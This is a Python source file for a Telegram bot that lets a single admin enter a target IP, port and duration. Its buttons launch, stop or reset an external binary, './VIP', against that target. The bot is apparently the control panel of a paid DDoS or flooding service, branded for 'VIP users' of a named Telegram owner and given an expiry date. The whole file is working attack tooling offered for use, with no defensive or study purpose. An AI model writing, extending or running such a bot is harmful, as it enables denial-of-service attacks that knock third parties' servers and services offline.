import subprocess
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from nexionn import TOKEN  # Import the TOKEN variable
from nexionn import ADMIN_ID  # Import the Admin ID 

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Expiry date
EXPIRY_DATE = datetime(2024, 12, 30)

# Path to your binary
BINARY_PATH = "./VIP"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = None

# Helper function to check if the script has expired
def check_expiry():
    current_date = datetime.now()
    if current_date > EXPIRY_DATE:
        logging.error("The script has expired. Please contact the developer for an updated version.")
        raise SystemExit("The script has expired. Please contact the developer for an updated version.")

# Helper function to check if the user is the admin
def is_admin(user_id):
    return user_id == ADMIN_ID

# Start command: Show Attack button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER")
        return

    keyboard = [[InlineKeyboardButton("🚀Attack🚀", callback_data='attack')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Hi VIP user of @NEXION_OWNER 🚀Press the Attack button to start (●'◡'●)", reply_markup=reply_markup)

# Handle button clicks
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if not is_admin(user_id):
        await query.answer("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER", show_alert=True)
        return

    await query.answer()

    if query.data == 'attack':
        await query.message.reply_text("Hi VIP user of @NEXION_OWNER. Please enter the target, port, and time in the format: <target> <port> <time> 🚀🚀")

# Handle target, port, and time input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port, attack_time

    user_id = update.message.from_user.id
    if not is_admin(user_id):
        await update.message.reply_text("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER")
        return

    try:
        # User input is expected in the format: <target> <port> <time>
        target, port, time = update.message.text.split()
        target_ip = target
        target_port = int(port)
        attack_time = int(time)

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [InlineKeyboardButton("Start Attack🚀", callback_data='start_attack')],
            [InlineKeyboardButton("Stop Attack❌", callback_data='stop_attack')],
            [InlineKeyboardButton("Reset Attack⚙️", callback_data='reset_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port}, Time: {attack_time} seconds configured.\n"
                                        "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text('''Invalid format. Please enter in the format: 
<target> <port> <time>🚀🚀''')

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time
    query = update.callback_query
    user_id = query.from_user.id

    if not is_admin(user_id):
        await query.message.reply_text("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER")
        return

    if not target_ip or not target_port or not attack_time:
        await query.message.reply_text("Please configure the target, port, and time first.")
        return

    if process and process.poll() is None:
        await query.message.reply_text("Attack is already running.")
        return

    try:
        # Run the binary with target, port, and time
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await query.message.reply_text(f"ATTACK STARTED: {target_ip}:{target_port} for {attack_time} seconds")
        logging.info(f"Attack started on {target_ip}:{target_port} for {attack_time} seconds")
    except Exception as e:
        await query.message.reply_text(f"Error starting attack: {e}")
        logging.error(f"Error starting attack: {e}")

# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    query = update.callback_query
    user_id = query.from_user.id

    if not is_admin(user_id):
        await query.message.reply_text("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER")
        return

    if not process or process.poll() is not None:
        await query.message.reply_text("No attack is currently running.")
        return

    try:
        process.terminate()
        process.wait()
        await query.message.reply_text("Attack stopped.")
        logging.info("Attack stopped.")
    except Exception as e:
        await query.message.reply_text(f"Error stopping attack: {e}")
        logging.error(f"Error stopping attack: {e}")

# Reset the attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time
    query = update.callback_query
    user_id = query.from_user.id

    if not is_admin(user_id):
        await query.message.reply_text("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER")
        return

    if process and process.poll() is None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    attack_time = None
    await query.message.reply_text("Attack reset. Please enter the target, port, and time in the format: <target> <port> <time>🚀")
    logging.info("Attack reset.")

# Button action handler for start/stop/reset actions
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if not is_admin(user_id):
        await query.answer("Access denied. This bot is for admin use only. Contact with admin @NEXION_OWNER", show_alert=True)
        return

    if query.data == 'start_attack':
        await start_attack(update, context)
    elif query.data == 'stop_attack':
        await stop_attack(update, context)
    elif query.data == 'reset_attack':
        await reset_attack(update, context)

# Main function to start the bot
def main():
    # Check script expiry
    check_expiry()

    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register button handler
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^attack$'))
    application.add_handler(CallbackQueryHandler(button_callback_handler, pattern='^(start_attack|stop_attack|reset_attack)$'))

    # Register message handler to handle input for target, port, and time
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()